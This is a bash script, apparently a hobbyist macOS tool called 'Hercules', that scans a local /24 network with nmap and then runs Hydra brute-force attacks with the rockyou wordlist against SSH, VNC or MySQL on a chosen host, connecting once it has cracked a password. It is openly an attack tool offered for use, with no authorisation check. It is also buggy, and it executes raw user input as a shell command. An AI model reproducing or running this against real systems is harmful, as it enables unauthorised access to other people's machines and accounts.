#!/bin/bash
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

#os of the computer
OS="darwin"

#for the wget functionality to work
SITE_URL="https://google.com"

# Root user
root=0

empty=("")

alphabet=("a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "x" "y" "z" "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "X" "Y" "Z")

#the yes array that contains the yes input
yes=("yes" "YES" "y" "Y")

#the array that contains the exit input
exit=("exit" "quit" "EXIT" "QUIT" "STOP" "stop")

# Gets the current time in a 12-hour format
CURRENT_TIME=$(date +"%I:%M:%S %p")

# Gets current date in mm/dd/yyyy format
CURRENT_DATE=$(date +"%m/%d/%Y")

# List of required packages/commands
required_packages=("wget",
                   "nmap",
                   "hydra",
                   "ssh",
                   "mysql")

# Function to check if a command exists
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Check if root user
if [[ $EUID -ne 0 ]]; then
  echo "ERROR: Please run as root."
  exit 1
fi

# Check for required packages
for package in "${required_packages[@]}"; do
  if ! command_exists "$package"; then
    echo -e "ERROR: The required package ${GREEN}'${required_packages[*]}'${NC} is not installed. Please install it and try again."
    exit 1
  fi
done
#when the user enters script --help it outputs the help message
if [ "$1" = "--help" || "$1" = "-h" ]; then
    figlet "? HELP ?"
    echo
    echo "+++++++++++++++Programs used+++++++++++++++"
    echo "This program will help you crack passwords"
    echo "It has two programs inside it, one is Hydra and the other is Nmap"
    echo
    echo "+++++++++++++++How to use++++++++++++++++++"
    echo "To use the program you have to tell the computer what port you want to scan."
    echo "It will then scan the port that you asked for on the network and see if any ports that you asked are open."
    echo "If there are any ports that are open, it will ask for a username and hostname."
    echo "When you give the program the username and hostname, it will try to crack that given parameters you gave it."
    echo
else
    if [[ "$OSTYPE" == "${OS}"* ]]; then
        clear
        if [[ $EUID -ne $root ]]; then
            # Error message if not running as root
            echo "ERROR:root:TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}" >> ERROR.LOG
            echo "TIME:${CURRENT_TIME} Please run as root. DATE:${CURRENT_DATE}"
            exit
        else
            sudo rm -rf hydra.restore
            clear

            # trys to connecto to the server
            wget -q --spider $SITE_URL

            # If the user is connected to the internet, it works as normal
            if [[ $? -eq 0 ]]; then
                echo
            
            # Else, it notifies them that they are not connected to the internet and tells them to connect
            else
                # Error message if offline notification
                offlineTitle="Offline"
                offline="TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
                osascript -e "display notification \"$offline\" with title \"$offlineTitle\""
                
                #offline text in the terminal
                echo "ERROR:root:TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}." >> ERROR.LOG
                echo "TIME:${CURRENT_TIME} You are offline. Please connect to the internet. DATE:${CURRENT_DATE}"
                exit 1
            fi

            # clear the terminal
            clear

            #tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
            Hercules() {
                # The logo of the program
                figlet -f slant "Hercules"

                echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
                echo "If you want to stop the program type 'stop'."
                read -p ">>> " service

                if [[ $service == "ALL" || $service == "all" ]]; then
                    # Tells the user that it can take up to an hour to complete the scanning process
                    echo -e "${RED}This can take up to 1 hour to complete.${NC}"
                    # Scan the entire network and display open ports
                    sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt --open
                    hydra -h
                    echo "Put in Hydra first to start the script."
                    echo ""
                    read -p ">>> " Hydra

                    if [[ " ${exit[*]} " == *" $Hydra "* ]]; then
                        echo "GoodBye"
                        exit
                    else
                        $Hydra
                        exit
                    fi

                #if the user asks what the program doess it goes to a funciton that helps them and explains what the program does
                elif [[ " ${exit[*]} " == *" $service "* ]]; then
                    echo "Stoping program..."
                    sleep 1
                    exit
                elif [[ " ${empty[*]} " == *" $service "* ]]; then
                    clear
                    Hercules

                #if the user input something that is not a number it says error
                elif [[ " ${alphabet[*]} " == *" $service "* ]]; then
                    echo "ERROR please input a number next time"
                    sleep 5
                    clear
                    Hercules                
                else
                    # Scan specific port
                    sudo nmap -sS 192.168.1.1/24 -p $service --open
                fi
            }

            RunHackingCommand() {
                #break in the outputs of my code
                echo 
                #services to crack the network
                echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
                echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
                read -p "Input Username: " user
                read -p "Input Hostname: " host
            }

            RunHackingCommandWithVNC() {
                if [[ $service == 5900 || $service == "VNC" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        Hercules
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack VNC password
                        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
                        #alerts the user that the computer is trying to connect to the VNC server
                        title="Connecting to ${user}"
                        Connecting_To_VNC_SERVER="We are connecting you to ${user} plase wait..."
                        osascript -e "display notification \"$Connecting_To_VNC_SERVER\" with title \"$title\""
                        
                        sleep 5

                        # it connects to the ssh server and asks for the user to input a password to connect to the ssh server
                        #notifcation for the user to see the computer is connected to the VNC server
                        title="Enter password to ${user}"
                        Connected_To_VNC_SERVER="We have conncted you to ${user} Plase enter the password to ${user} to continue..."
                        osascript -e "display notification \"$Connected_To_VNC_SERVER\" with title \"$title\""
                        # put the 
                        echo "Loading VNC server..."
                        open vnc://$host
                        exit
                    fi
                fi
            }

            RunHackingCommandWithSSH() {
                if [[ $service == 22 || $service == "ssh" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        Hercules
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else

                        # Crack SSH password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
                        #alerts the user that the computer is trying to connect to the ssh server
                        title="Connecting to ${user}"
                        Connecting_To_SSH_SERVER="We are connecting you to ${user} plase wait..."
                        osascript -e "display notification \"$Connecting_To_SSH_SERVER\" with title \"$title\""
                        
                        sleep 5

                        # it connects to the ssh server and asks for the user to input a password to connect to the ssh server
                        title="Enter password to ${user}"
                        Connected_To_SSH_SERVER="We have conncted you to ${user} Plase enter the password to ${user} to continue..."
                        osascript -e "display notification \"$Connected_To_SSH_SERVER\" with title \"$title\""
                        
                        ssh $user@$host
                    fi
                fi
            }

            RunHackingCommandWithMySQL() {
                if [[ $service == 3306 || $service == "mysql" ]]; then
                    # Checks if the user has put anything in the 'Input Username' function and the hostname function
                    # If not, it will prompt the user to enter the username and hostname
                    if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
                        # No service specified, re-prompt for input
                        echo "No service specified"
                        Hercules
                    # If the user inputs something in the 'Input Username' function and the hostname function,
                    # it will continue as normal
                    else
                        # Crack MySQL password
                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
                        echo "Loading MySQL server..."
                        sleep 3
                        mysql -u $user -p -A
                    fi
                fi
            }
            
            Hercules # Calls the Hercules function

            RunHackingCommand # Calls the RunHackingCommand function

            RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function

            RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function

            RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
        fi
    else
        clear
        # Warning message for wrong OS
        echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
        echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
    fi
fi